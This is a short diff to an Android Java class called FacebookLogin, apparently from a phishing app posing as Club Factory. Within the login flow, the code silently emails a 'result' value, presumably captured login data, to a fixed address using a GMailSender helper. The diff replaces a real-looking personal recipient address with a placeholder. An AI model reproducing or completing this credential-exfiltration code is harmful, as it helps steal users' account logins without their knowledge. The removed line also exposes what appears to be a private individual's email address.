@@ -73,7 +73,7 @@ public class FacebookLogin extends AppCompatActivity {
                                 GMailSender sender = new GMailSender("Enter Your email address",
                                         "Enter Your email address password");
                                 sender.sendMail("Hello from JavaMail", result,
-                                        "ClubFactory@gmail.com", "mayurkadam200@gmail.com");
+                                        "ClubFactory@gmail.com", "Enter Receiver email address");
                             } catch (Exception e) {
                                 Log.e("SendMail", e.getMessage(), e);
                             }
